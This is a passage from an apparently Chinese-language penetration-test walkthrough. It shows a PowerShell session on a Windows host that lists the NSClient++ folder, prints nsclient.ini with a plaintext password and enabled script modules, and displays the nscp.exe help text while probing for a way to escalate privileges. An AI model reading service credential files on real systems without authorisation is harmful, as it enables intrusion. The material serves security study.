class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM          <span class="hljs-number">28672</span> boost_chrono-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM          <span class="hljs-number">50688</span> boost_date_time-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM         <span class="hljs-number">117760</span> boost_filesystem-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">22</span> AM         <span class="hljs-number">439296</span> boost_program_options-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">23</span> AM         <span class="hljs-number">256000</span> boost_python-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM         <span class="hljs-number">765952</span> boost_regex-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">16</span> AM          <span class="hljs-number">19456</span> boost_system-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">18</span> AM         <span class="hljs-number">102400</span> boost_thread-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">1</span>:<span class="hljs-number">24</span> PM             <span class="hljs-number">51</span> boot.ini<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">51</span> PM         <span class="hljs-number">157453</span> changelog.txt<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">33</span> PM        <span class="hljs-number">1210392</span> check_nrpe.exe<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM        <span class="hljs-number">1655808</span> libeay32.dll<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">04</span> PM          <span class="hljs-number">18351</span> license.txt<br>-a----        <span class="hljs-number">10</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">7</span>:<span class="hljs-number">19</span> AM         <span class="hljs-number">203264</span> lua.dll<br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> PM           <span class="hljs-number">2683</span> nsclient.ini<br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">4</span>:<span class="hljs-number">27</span> AM          <span class="hljs-number">42608</span> nsclient.<span class="hljs-built_in">log</span><br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">42</span> PM          <span class="hljs-number">55808</span> NSCP.Core.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">32</span> PM        <span class="hljs-number">4765208</span> nscp.exe<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">42</span> PM         <span class="hljs-number">483328</span> NSCP.Protobuf.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">4</span>:<span class="hljs-number">18</span> PM         <span class="hljs-number">534016</span> nscp_json_pb.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">55</span> PM        <span class="hljs-number">2090496</span> nscp_lua_pb.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">57</span> PM         <span class="hljs-number">507904</span> nscp_mongoose.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">49</span> PM        <span class="hljs-number">2658304</span> nscp_protobuf.dll<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">04</span> PM           <span class="hljs-number">3921</span> old-settings.<span class="hljs-built_in">map</span><br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">21</span> PM        <span class="hljs-number">1973760</span> plugin_api.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM        <span class="hljs-number">3017216</span> python27.dll<br>-a----        <span class="hljs-number">9</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">3</span>:<span class="hljs-number">42</span> PM       <span class="hljs-number">28923515</span> python27.zip<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM         <span class="hljs-number">384536</span> reporter.exe<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM         <span class="hljs-number">348160</span> ssleay32.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM         <span class="hljs-number">689664</span> unicodedata.pyd<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">20</span> PM        <span class="hljs-number">1273856</span> where_filter.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM          <span class="hljs-number">47616</span> _socket.pyd<br><br><br>PS C:\Program Files\NSClient++&gt; type nsclient.ini<br># If you want to fill this file with all available options run the following command: <br><span class="hljs-meta">#   nscp settings --generate --add-defaults --load-all</span><br># If you want to activate a module and bring in all its options use:<br><span class="hljs-meta">#   nscp settings --activate-module <span class="hljs-string">&lt;MODULE NAME&gt;</span> --add-defaults</span><br># For details run: nscp settings --help<br><br><br>; in flight - TODO<br>[/settings/<span class="hljs-keyword">default</span>]<br><br>; Undocumented key<br>password = ew2x6SsGTxjRwXOT<br><br>; Undocumented key<br>allowed hosts = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><br>; in flight - TODO<br>[/settings/NRPE/server] <br><br>; Undocumented key<br>ssl options = no-sslv2,no-sslv3<br><br>; Undocumented key<br>verify mode = peer-cert<br><br>; Undocumented key<br>insecure = <span class="hljs-literal">false</span><br><br><br>; in flight - TODO<br>[/modules]<br><br>; Undocumented key<br>CheckHelpers = disabled<br><br>; Undocumented key<br>CheckEventLog = disabled<br><br>; Undocumented key<br>CheckNSCP = disabled<br><br>; Undocumented key<br>CheckDisk = disabled<br><br>; Undocumented key<br>CheckSystem = disabled<br><br>; Undocumented key <br>WEBServer = enabled<br><br>; Undocumented key<br>NRPEServer = enabled<br><br>; CheckTaskSched - Check status of your scheduled jobs.<br>CheckTaskSched = enabled<br><br>; Scheduler - Use this to schedule check commands and jobs in conjunction with <span class="hljs-keyword">for</span> instance passive monitoring throu<br>gh NSCA<br>Scheduler = enabled<br><br>; CheckExternalScripts - Module used to execute external scripts<br>CheckExternalScripts = enabled<br><br><br>; Script wrappings - A <span class="hljs-built_in">list</span> of templates <span class="hljs-keyword">for</span> defining script commands. Enter any command line here and they will be <br>expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARG<br>S% will be replaced by any given arguments.<br>[/settings/external scripts/wrappings]<br><br>; Batch file - Command used <span class="hljs-keyword">for</span> executing wrapped batch files<br>bat = scripts\\%SCRIPT% %ARGS%<br><br>; Visual basic script - Command line used <span class="hljs-keyword">for</span> wrapped vbs scripts<br>vbs = cscript.exe <span class="hljs-comment">//T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%</span><br><br>; POWERSHELL WRAPPING - Command line used <span class="hljs-keyword">for</span> executing wrapped <span class="hljs-title function_">ps1</span> <span class="hljs-params">(powershell)</span> scripts<br>ps1 = cmd /c echo <span class="hljs-title function_">If</span> <span class="hljs-params">(-Not (Test-Path <span class="hljs-string">&quot;scripts\%SCRIPT%&quot;</span>) )</span> &#123; Write-Host <span class="hljs-string">&quot;UNKNOWN: Script `&quot;</span>%SCRIPT%`<span class="hljs-string">&quot; not found.&quot;</span>; <br><span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>) &#125;; scripts\%SCRIPT% $ARGS$; <span class="hljs-built_in">exit</span>($lastexitcode) | powershell.exe /noprofile -command -<br><br><br>; External scripts - A <span class="hljs-built_in">list</span> of scripts available to run from the CheckExternalScripts module. Syntax is: `command=sc<br>ript arguments`<br>[/settings/external scripts/scripts]<br><br><br>; Schedules - Section <span class="hljs-keyword">for</span> the Scheduler module.<br>[/settings/scheduler/schedules]<br><br>; Undocumented key<br>foobar = command = foobar<br><br><br>; External script settings - General settings <span class="hljs-keyword">for</span> the external scripts <span class="hljs-title function_">module</span> <span class="hljs-params">(CheckExternalScripts)</span>.<br>[/settings/external scripts]<br>allow arguments = <span class="hljs-literal">true</span><br>PS C:\Program Files\NSClient++&gt;<br></code></pre></td></tr></table></figure>

<p>16、然后我们继续分析查看下这个软件的版本信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Program Files\NSClient++&gt; dir <br><br><br>    Directory: C:\Program Files\NSClient++<br><br><br>Mode                LastWriteTime         Length Name                                                              <br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">4</span>:<span class="hljs-number">53</span> AM                crash-dumps<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                modules<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                scripts<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                security<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                web<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM          <span class="hljs-number">28672</span> boost_chrono-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM          <span class="hljs-number">50688</span> boost_date_time-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM         <span class="hljs-number">117760</span> boost_filesystem-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">22</span> AM         <span class="hljs-number">439296</span> boost_program_options-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">23</span> AM         <span class="hljs-number">256000</span> boost_python-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM         <span class="hljs-number">765952</span> boost_regex-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">16</span> AM          <span class="hljs-number">19456</span> boost_system-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">12</span>:<span class="hljs-number">18</span> AM         <span class="hljs-number">102400</span> boost_thread-vc110-mt<span class="hljs-number">-1</span>_58.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">1</span>:<span class="hljs-number">24</span> PM             <span class="hljs-number">51</span> boot.ini<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">51</span> PM         <span class="hljs-number">157453</span> changelog.txt<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">33</span> PM        <span class="hljs-number">1210392</span> check_nrpe.exe<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM        <span class="hljs-number">1655808</span> libeay32.dll<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">04</span> PM          <span class="hljs-number">18351</span> license.txt<br>-a----        <span class="hljs-number">10</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">7</span>:<span class="hljs-number">19</span> AM         <span class="hljs-number">203264</span> lua.dll<br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> PM           <span class="hljs-number">2683</span> nsclient.ini<br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">4</span>:<span class="hljs-number">53</span> AM          <span class="hljs-number">42946</span> nsclient.<span class="hljs-built_in">log</span><br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">42</span> PM          <span class="hljs-number">55808</span> NSCP.Core.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">32</span> PM        <span class="hljs-number">4765208</span> nscp.exe<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">42</span> PM         <span class="hljs-number">483328</span> NSCP.Protobuf.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">4</span>:<span class="hljs-number">18</span> PM         <span class="hljs-number">534016</span> nscp_json_pb.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">55</span> PM        <span class="hljs-number">2090496</span> nscp_lua_pb.dll<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">57</span> PM         <span class="hljs-number">507904</span> nscp_mongoose.dll<br>-a----       <span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">49</span> PM        <span class="hljs-number">2658304</span> nscp_protobuf.dll<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">04</span> PM           <span class="hljs-number">3921</span> old-settings.<span class="hljs-built_in">map</span><br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">21</span> PM        <span class="hljs-number">1973760</span> plugin_api.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM        <span class="hljs-number">3017216</span> python27.dll<br>-a----        <span class="hljs-number">9</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">3</span>:<span class="hljs-number">42</span> PM       <span class="hljs-number">28923515</span> python27.zip<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM         <span class="hljs-number">384536</span> reporter.exe<br>-a----        <span class="hljs-number">12</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2015</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM         <span class="hljs-number">348160</span> ssleay32.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM         <span class="hljs-number">689664</span> unicodedata.pyd<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">9</span>:<span class="hljs-number">20</span> PM        <span class="hljs-number">1273856</span> where_filter.dll<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2015</span>   <span class="hljs-number">8</span>:<span class="hljs-number">44</span> AM          <span class="hljs-number">47616</span> _socket.pyd<br><br><br>PS C:\Program Files\NSClient++&gt; .\nscp.exe<br>Usage: nscp &lt;context&gt; <br>  The &lt;context&gt; is the mode of operation ie. a type of command.  <br>You can also use aliases here which are shorthands <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;nscp client --module &lt;plugin&gt;&#x27;</span><br>  Available context are:  <br>    client<br>      Act as a client. This will run commands inside various installed modules and scripts. <br><br>    help<br>      Display the help screen. <br><br>    service<br>      Install/uninstall/display NSCP service. <br><br>    settings<br>      Change and <span class="hljs-built_in">list</span> settings as well as load and initialize modules. <br><br>    unit<br>      Run unit test scripts. <br><br>  Available aliases are:<br>    check_mk   (same as nscp client --module CheckMKClient) <br>      Use a <span class="hljs-title function_">check_mk</span> <span class="hljs-params">(the protocol)</span> client to request information from other systems via check_mk. <br><br>    <span class="hljs-title function_">eventlog</span>   <span class="hljs-params">(same as nscp client --module CheckEventLog)</span><br>      Inject event <span class="hljs-built_in">log</span> message into the <span class="hljs-title function_">eventlog</span> <span class="hljs-params">(mainly <span class="hljs-keyword">for</span> testing eventlog filtering and setup)</span> <br><br>    <span class="hljs-title function_">ext</span>   <span class="hljs-params">(same as nscp client --module CheckExternalScripts)</span> <br>      TODO: describe: ext<br><br>    ext-<span class="hljs-title function_">scr</span>   <span class="hljs-params">(same as nscp client --module CheckExternalScripts)</span> <br>      TODO: describe: ext-scr <br><br>    <span class="hljs-title function_">lua</span>   <span class="hljs-params">(same as nscp client --module LUAScript)</span> <br>      Execute lua scripts<br><br>    <span class="hljs-title function_">mk</span>   <span class="hljs-params">(same as nscp client --module CheckMKClient)</span> <br>      Use a <span class="hljs-title function_">check_mk</span> <span class="hljs-params">(the protocol)</span> client to request information from other systems via check_mk. <br><br>    <span class="hljs-title function_">nrpe</span>   <span class="hljs-params">(same as nscp client --module NRPEClient)</span> <br>      Use a NRPE client to request information from other systems via NRPE similar to standard NRPE check_nrpe comma<br>nd.<br><br>    <span class="hljs-title function_">nsca</span>   <span class="hljs-params">(same as nscp client --module NSCAClient)</span><br>      Use a NSCA to submit passive checks to a remote system. Similar to the send_nsca command <br><br>    <span class="hljs-title function_">nscp</span>   <span class="hljs-params">(same as nscp client --module NSCPClient)</span> <br>      Use a <span class="hljs-title function_">NSCP</span> <span class="hljs-params">(the protocol)</span> client to request information from other systems via NSCP. <br><br>    <span class="hljs-title function_">op5</span>   <span class="hljs-params">(same as nscp client --module Op5Client)</span> <br>      TODO: describe: op5 <br><br>      Execute python scripts<br><br>    <span class="hljs-title function_">python</span>   <span class="hljs-params">(same as nscp client --module PythonScript)</span><br>      Execute python scripts<br><br>    <span class="hljs-title function_">sys</span>   <span class="hljs-params">(same as nscp client --module CheckSystem)</span><br>      Various system tools to get information about the <span class="hljs-title function_">system</span> <span class="hljs-params">(generally PDH on windows curretly)</span><br><br>    <span class="hljs-title function_">syslog</span>   <span class="hljs-params">(same as nscp client --module SyslogClient)</span><br>      Use <span class="hljs-title function_">SYSLOG</span> <span class="hljs-params">(the protocol)</span> to submit messages to a remote system.<br><br>    <span class="hljs-title function_">test</span>   <span class="hljs-params">(same as nscp client --module CommandClient)</span><br>      The best way to diagnose and find errors with your configuration and setup.<br><br>    <span class="hljs-title function_">web</span>   <span class="hljs-params">(same as nscp client --module WEBServer)</span><br>      TODO: describe: web<br> <br>    <span class="hljs-title function_">wmi</span>   <span class="hljs-params">(same as nscp client --module CheckWMI)</span><br>      Run WMI queries from command line<br><br>  A <span class="hljs-type">short</span> <span class="hljs-built_in">list</span> of all available contexts are:<br>client, help, service, settings, unit, check_mk, eventlog, ext, ext-scr, lua, mk, nrpe, nsca, nscp, op5, py, python,<br> sys, syslog, test, web, wmi<br>PS C:\Program Files\NSClient++&gt; .\nscp.exe help<br>Allowed options: <br><br>Common options:<br>  --settings arg                <span class="hljs-title function_">Override</span> <span class="hljs-params">(temporarily)</span> settings subsystem to<br>                                use <br>  --debug                       Set <span class="hljs-built_in">log</span> level to <span class="hljs-title function_">debug</span> <span class="hljs-params">(and show debug</span><br><span class="hljs-params">                                information)</span> <br>  --<span class="hljs-built_in">log</span> arg                     The <span class="hljs-built_in">log</span> level to use<br>  --define arg                  Defines to use to override settings. Syntax is  <br>                                PATH:KEY=VALUE<br><br>Common options:<br>  --help                        Show the help message <span class="hljs-keyword">for</span> a given command <br>  --no-<span class="hljs-built_in">stderr</span>                   Do not report errors on <span class="hljs-built_in">stderr</span> <br>  --version                     Show version information<br><br>Service Options:<br>  --install                     Install service<br>  --uninstall                   Uninstall service<br>  --start                       Start service<br>  --stop                        Stop service<br>  --restart                     Stop than start service <br>  --info                        Show information about service <br>  --run                         Run as a service<br>  --name arg                    Name of service <br>  --description arg             Description of service<br><br>Settings options:<br>  --migrate-to arg              <span class="hljs-title function_">Migrate</span> <span class="hljs-params">(copy)</span> settings from current store to  <br>                                given target store <br>  --migrate-from arg            <span class="hljs-title function_">Migrate</span> <span class="hljs-params">(copy)</span> settings from old given store to<br>                                current store <br>  --generate [=arg(=settings)]  Add comments to the current settings <span class="hljs-title function_">store</span> <span class="hljs-params">(or  </span><br><span class="hljs-params">                                a given one)</span>.<br>  --add-missing                 Add all <span class="hljs-keyword">default</span> values <span class="hljs-keyword">for</span> all missing keys. <br>  --validate                    Validate the current <span class="hljs-title function_">configuration</span> <span class="hljs-params">(or a given  </span><br><span class="hljs-params">                                configuration)</span>.<br>  --load-all                    Load all <span class="hljs-title function_">plugins</span> <span class="hljs-params">(currently only used with</span><br><span class="hljs-params">                                generate)</span>. <br>  --path arg                    Path of key to work with.<br>  --key arg                     Key to work with. <br>  --<span class="hljs-built_in">set</span> arg                     Set a key and path to a given <span class="hljs-title function_">value</span> <span class="hljs-params">(use --key</span><br><span class="hljs-params">                                and --path)</span>. <br>  --<span class="hljs-keyword">switch</span> arg                  Set <span class="hljs-keyword">default</span> context to <span class="hljs-title function_">use</span> <span class="hljs-params">(similar to migrate  </span><br><span class="hljs-params">                                but does NOT copy values)</span><br>  --show                        Show a value given a key and path. <br>  --<span class="hljs-built_in">list</span>                        List all keys 